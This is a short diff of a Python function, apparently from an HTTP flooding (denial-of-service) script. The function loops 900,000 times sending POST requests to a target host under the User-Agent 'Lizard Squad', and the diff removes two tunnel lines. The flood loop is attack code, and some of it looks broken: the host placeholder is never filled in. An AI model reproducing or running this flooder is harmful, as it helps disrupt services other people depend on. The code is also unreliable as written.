@@ -87,7 +87,7 @@ def httpcall(url):
 	try:
 		for i in range(900000):
 		
-			request.set_tunnel('www.google.com', 443)
+			
 			request.send('POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Lizard Squad\r\n\r\n', host)
 	except socket.error:
 			#print e.code
@@ -96,7 +96,6 @@ def httpcall(url):
 			code=500
 	else:
 			inc_counter()
-			request.set_tunnel('www.google.com', 443)
 			request.send('POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Lizard Squad\r\n\r\n', host)
 	return(code)		
 
